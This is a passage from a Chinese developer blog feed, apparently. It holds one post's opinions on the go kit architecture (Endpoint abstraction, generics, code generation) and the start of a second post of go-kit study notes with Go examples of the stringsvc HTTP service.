&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于写过 rpcx 或者 gRPC 的朋友来说，Endpoint 更像是个脱裤子放屁的封装。只要把接口参数约定成 &lt;code>func (ctx context.Context, req interface{}) (interface{}, error)&lt;/code> 不就完了？传输层收到的请求解码成本地数据类型，然后按约定传入，就万事大吉了。&lt;/p>
&lt;p>空口无凭，不如看看如果不要 endpoint，实际编写的代码会变成什么样。&lt;/p>
&lt;p>像是 go kit 提供的这种帮助函数：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="nx">uppercaseHandler&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nf">makeUppercaseEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">decodeUppercaseRequest&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">encodeResponse&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="nx">countHandler&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nf">makeCountEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">decodeCountRequest&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">encodeResponse&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可能就会变成这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="nx">uppercaseHandler&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Uppercase&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">decodeUppercaseRequest&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">encodeResponse&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="nx">countHandler&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Count&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">decodeCountRequest&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">encodeResponse&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当然，为了让 Go 语言的类型系统开心，这里的 &lt;code>svc.Uppercase&lt;/code> 和 &lt;code>svc.Count&lt;/code> 得是一样的签名，或者用 &lt;code>interface{}&lt;/code> 做形参，又或者考虑还没有发布的泛型能不能支持。&lt;/p>
&lt;p>看起来是舒服了很多对吧？Endpoint 没了。但还有个问题：中间件。要怎么实现通用的中间件，应用在每个原本应该是 Endpoint 的地方？&lt;/p>
&lt;p>例如在微服务系统里很常见的分布式跟踪、metrics收集，无论最终采用的是 opentracing、opencecus、opentelemetry 还是 zipkin、prometheus，跟踪调用链路是一个很基本的可观测性要求。当然，你可以说用 linkerd 一类的 service mesh 解决方案（虽然我觉得不能替代上面提到的这些东西），但也应该有所警惕：我们是不是还有需要在每个接口上都执行、和传输层无关的代码？对，还有身份验证和鉴权工作。还有吗？&lt;/p>
&lt;p>当然，也不是脱离了 Endpoint 就别无他法，只是在需要的时候，我想总还是会有意无意抽象出一个类似 endpoint 的层级——可能隐藏在 service 中间件里，也可能交给了传输层。可能写得更好，也可能又是在堆屎山。经验告诉我在一个需要长期支持的系统里，人是靠不住的，但规范可以。endpoint 并没有牺牲多少编码上的自由度，但一定程度上避免了潜在的堆屎可能，我觉得完全可以接受。&lt;/p>
&lt;h2 id="generic-会如何影响-go-kit-架构">generic 会如何影响 go kit 架构&lt;/h2>
&lt;p>我直说，Go 的泛型（beta1）就是一泡狗屎，我向来不喜欢 Go 团队的品味，从 slice 和 interface{} 泄露语言的实现细节到其他更离谱的东西。但现在 Go 泛型还没有正式公布（预期就在本月），现在我也没什么好评论的。&lt;/p>
&lt;p>generic 会影响 go kit 的架构吗？我的看法是不会。泛型也许能极大帮助各种容器类型、迭代器之类饱受 &lt;code>interface{}&lt;/code> 折磨的组件，但是 go kit 用得上泛型的地方其实不多。少数常见的 &lt;code>interface{}&lt;/code> 场合，都是在从一个类型适配到另一个类型，代码编写者清楚自己要处理的两个类型，但 go kit 不知道。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">makeUppercaseEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span> &lt;span class="nx">StringService&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Endpoint&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{})&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">request&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">uppercaseRequest&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">uppercaseResponse&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">()},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">uppercaseResponse&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这部分适配代码如果把 &lt;code>interface{}&lt;/code> 替换成具体的 &lt;code>uppercaseRequest&lt;/code> 和 &lt;code>uppercaseResponse&lt;/code> 的话，就需要 go kit 提供泛型形式的 Endpoint 接口了，像是这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">Endpoint&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">RequestType&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">ResponseType&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">RequestType&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ResponseType&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面的代码有效无效先不说，我记得在 beta1 尝试泛型的时候发现 Go 在推断类型的时候存在问题，这个 &lt;code>RequestType&lt;/code> 和 &lt;code>ResponseType&lt;/code> 在实际用的时候怕是要写不止一次。又是 Go 特色的啰嗦。&lt;/p>
&lt;p>可即便是这样恐怕还有问题，如果修改了 &lt;code>Endpoint&lt;/code> 的签名，那么 &lt;code>endpoint.Middleware&lt;/code> 恐怕也要泛型化，原来的所有中间件库，&lt;code>trace&lt;/code>、&lt;code>auth&lt;/code>、&lt;code>metrics&lt;/code> 可能也得做泛型化改造。对一个已经深度开发过的系统来说，为了这一点类型检查的好处付出如此代价恐怕是不能接受的。&lt;/p>
&lt;p>总而言之，我的观点是 Generic 可能带来变化，但根本上的几个抽象不大可能跟着重构，这是由 go kit 性质决定的。&lt;/p>
&lt;h2 id="go-kit-代码生成">go kit 代码生成&lt;/h2>
&lt;p>但凡跟着 go kit 写过一个 stringsvc 的人都会感觉到 go kit 有多少样板代码，适配传输层需要编写 encode/decode，本地结构转函数签名所需的参数又要一次转换，传输层协议监听、注册&lt;code>Handler&lt;/code>、客户端连接都要自己编写代码，构造和注册 &lt;code>Endpoint&lt;/code> 复杂性无非是从 &lt;code>func main&lt;/code> 移动到 &lt;code>transport&lt;/code> 或者反过来，尽管很烦，但又无法根本上消除。&lt;/p>
&lt;p>如果是 C++ 恐怕会有模板元编程大佬晒自己的 &lt;code>template&lt;/code>，但 Go 基本没有编译时和运行时的元编程能力。唯一比较擅长的就只有个代码生成了。Go 提供的 &lt;code>ast/parser&lt;/code> 包很赞，别的语言少有提供这么方便的接口的。&lt;/p>
&lt;p>go kit 的代码生成，从目前体验中感受来看，主要是需要下面的功能：&lt;/p>
&lt;ol>
&lt;li>从 &lt;code>interface&lt;/code> 定义生成对应的 &lt;code>makeEndpoint&lt;/code> 函数和请求/响应结构体。这部分代码基本没什么特别的。&lt;/li>
&lt;li>从 &lt;code>interface&lt;/code> 定义生成对应的 &lt;code>transport&lt;/code> 包，可以自己选择协议。主要解决 encode/decode 手写麻烦的问题。&lt;/li>
&lt;li>从 &lt;code>interface&lt;/code> 定义生成服务构造和启动代码，应用可以自己构造，但 &lt;code>endpoint&lt;/code> 的构造和 &lt;code>middleware&lt;/code> 的应用就可以不用自己写了。&lt;/li>
&lt;/ol>
&lt;p>这三处的样板代码最多，而且代码本身并不特别，都是简单地对类型进行适配，手写完全是浪费时间，还会引入人为的不确定性，不如让机器搞定。目前考察过的 &lt;a class="link" href="https://github.com/GrantZheng/kit" target="_blank" rel="noopener"
>kit&lt;/a> 实现了其中一大部分，但 transport 支持太少，也没有生成注册 endpoint 的代码，依然存在很多手写的样板代码。我简单看了下实现，用 &lt;a class="link" href="https://github.com/dave/jennifer" target="_blank" rel="noopener"
>jennifer&lt;/a> 生成代码好是挺好，就是 go 代码显得有点乱 &amp;hellip;&lt;/p>
&lt;p>我寻思对 generator 简单重构下实现关注点分离的话，还是能满足上面提到的这些东西的。最好的情况是定义好 interface 之后，生成代码，编写主函数，就能直接运行了。同时又不伤害 go kit 架构本身的扩展性和可定制性。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/my-opinion-of-gokit-architecture/image-20220302154943857.png"
width="420"
height="533"
srcset="https://nnnewb.github.io/blog/blog/p/my-opinion-of-gokit-architecture/image-20220302154943857_hu9cb516ff1b199527543c48b61b9d85b3_16922_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/my-opinion-of-gokit-architecture/image-20220302154943857_hu9cb516ff1b199527543c48b61b9d85b3_16922_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="go kit架构的服务"
class="gallery-image"
data-flex-grow="78"
data-flex-basis="189px"
>&lt;/p>
&lt;p>蛮喜欢 go kit 项目作者的一句话：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/my-opinion-of-gokit-architecture/image-20220302155216922.png"
width="917"
height="220"
srcset="https://nnnewb.github.io/blog/blog/p/my-opinion-of-gokit-architecture/image-20220302155216922_hu9feb75af39e108f8eeb86c8e5ed70db9_25876_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/my-opinion-of-gokit-architecture/image-20220302155216922_hu9feb75af39e108f8eeb86c8e5ed70db9_25876_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="issue截图"
class="gallery-image"
data-flex-grow="416"
data-flex-basis="1000px"
>&lt;/p>
&lt;blockquote>
&lt;p>Honestly the best way to &amp;ldquo;use&amp;rdquo; Go kit is to cop it&amp;rsquo;s architectural model and not actually import any of its packages at all 😉&lt;/p>
&lt;/blockquote>
&lt;p>其实我也想把这套架构搬进项目里，可惜条件不允许，还有更严重的问题要处理，只能先眼馋一下，吸收下精神。&lt;/p></description></item><item><title>go-kit 笔记</title><link>https://nnnewb.github.io/blog/p/go-kit-note/</link><pubDate>Tue, 01 Mar 2022 12:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/go-kit-note/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>初步看了下 gokit 的案例 &lt;code>stringsvc&lt;/code>和&lt;code>apigateway&lt;/code>，记录一下对 gokit 的映像。&lt;/p>
&lt;h2 id="gokit定位">gokit定位&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Go kit&lt;/strong> is a &lt;strong>programming toolkit&lt;/strong> for building microservices (or elegant monoliths) in Go. We solve common problems in distributed systems and application architecture so you can focus on delivering business value.&lt;/p>
&lt;p>Go has emerged as the language of the server, but it remains underrepresented in so-called &amp;ldquo;modern enterprise&amp;rdquo; companies like Facebook, Twitter, Netflix, and SoundCloud. Many of these organizations have turned to JVM-based stacks for their business logic, owing in large part to libraries and ecosystems that directly support their microservice architectures.&lt;/p>
&lt;p>To reach its next level of success, Go needs more than simple primitives and idioms. It needs a comprehensive toolkit, for coherent distributed programming in the large. Go kit is a set of packages and best practices, which provide a comprehensive, robust, and trustable way of building microservices for organizations of any size.&lt;/p>
&lt;/blockquote>
&lt;p>gokit 大概算是框架，因为和 gokit 打交道基本离不开 gokit 定义的几个接口类型。用 gokit 开发服务的可定制性很强，几乎每个细节都可以控制。&lt;/p>
&lt;p>而实际上手体验下来，缺点大概就是海量的样板代码，实现一个服务需要大量的适配代码来控制 Endpoint 。又因为 Go 语言表现力不足，也没有运行时元编程的能力，这些样板代码只能靠代码生成来解决。&lt;/p>
&lt;p>还好 gokit 自己也知道，在仓库首页就提供了很多代码生成器的链接。&lt;/p>
&lt;p>用 gokit 还有一个好处是一定程度上避免技术栈绑定在某个特定平台或者框架上，毕竟 gokit 比起框架，更像是一个工具箱，组件之间没有特别的依赖关系，顺手就用，不顺手可以换个锤子。&lt;/p>
&lt;h2 id="框架搭建">框架搭建&lt;/h2>
&lt;h3 id="鸟瞰">鸟瞰&lt;/h3>
&lt;p>gokit 编写的服务有几个基本元素，这些基本元素都是围绕 &lt;strong>Endpoint&lt;/strong> 接口转的，gokit 自己把 Endpoint 称为 &lt;em>构建服务器和客户端的基本块&lt;/em> 。&lt;/p>
&lt;p>几个基本元素是：&lt;/p>
&lt;ul>
&lt;li>服务接口定义 &lt;code>type StringService interface { /*...*/ }&lt;/code>&lt;/li>
&lt;li>应用级中间件定义 &lt;code>type AppMiddleware struct {} // implement StringService&lt;/code>&lt;/li>
&lt;li>传输层接口定义，包括 &lt;code>Endpoint&lt;/code> 定义、序列化、服务发现等&lt;/li>
&lt;li>传输层中间件定义，&lt;code>type Middleware func(Endpoint) Endpoint&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>此外还有一些可选的组件：&lt;/p>
&lt;ul>
&lt;li>&lt;code>tracing&lt;/code>，分布式跟踪&lt;/li>
&lt;li>&lt;code>ratelimit&lt;/code>，限流&lt;/li>
&lt;li>&lt;code>metrics&lt;/code>，指标收集&lt;/li>
&lt;li>&lt;code>log&lt;/code>，日志收集&lt;/li>
&lt;li>&lt;code>circuitbreaker&lt;/code>，熔断&lt;/li>
&lt;li>&lt;code>auth&lt;/code>，身份认证&lt;/li>
&lt;/ul>
&lt;p>我自己整的目录结构如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228155029310.png"
width="234"
height="255"
srcset="https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228155029310_hu1b61ce4442b934d4130680e952a0c52e_9034_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/go-kit-note/image-20220228155029310_hu1b61ce4442b934d4130680e952a0c52e_9034_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="目录结构"
class="gallery-image"
data-flex-grow="91"
data-flex-basis="220px"
>&lt;/p>
&lt;p>服务本质是一系列接口的集合，gokit 的 tutorial 中将服务抽象成了一个 &lt;code>interface&lt;/code> ，在这个接口上用户可以提供不同实现。像是服务端、客户端、中间件，不管传输层怎么定义，最终实现的都是这个接口。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">StringService&lt;/span> &lt;span class="kd">interface&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">Count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>微服务的开发者提供这个接口的实现。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">StringServiceImpl&lt;/span> &lt;span class="kd">struct&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">StringServiceImpl&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">arg&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">arg&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">strings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ToUpper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">arg&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">StringServiceImpl&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">arg&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">arg&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后通过某种传输层协议暴露给调用方。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">MakeUppercaseEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span> &lt;span class="nx">stringsvc1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StringService&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Endpoint&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{})&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">request&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">UppercaseRequest&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">UppercaseResponse&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">V&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// ... 略
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">logger&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewLogfmtLogger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stderr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">svc&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">stringsvc1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StringServiceImpl&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">uppercase&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">transport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MakeUppercaseEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">uppercaseHandler&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">uppercase&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">transport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DecodeUppercaseRequest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">transport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">EncodeResponse&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Handle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/uppercase&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">uppercaseHandler&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">count&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">transport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MakeCountEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">countHandler&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">count&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">transport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DecodeCountRequest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">transport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">EncodeResponse&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Handle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/count&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">countHandler&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;msg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;HTTP&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;addr&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;:8080&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;err&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ListenAndServe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;:8080&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个简单的服务提供方需要做的就是这些。下面具体看看其中涉及的概念。&lt;/p>
&lt;h3 id="endpoint-解析">endpoint 解析&lt;/h3>
&lt;p>一个最简单的服务 &lt;code>Endpoint&lt;/code> 定义如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;context&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;encoding/json&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;os&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;strings&amp;#34;&lt;/span>
&lt;span class="nx">httptransport&lt;/span> &lt;span class="s">&amp;#34;github.com/go-kit/kit/transport/http&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/go-kit/log&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
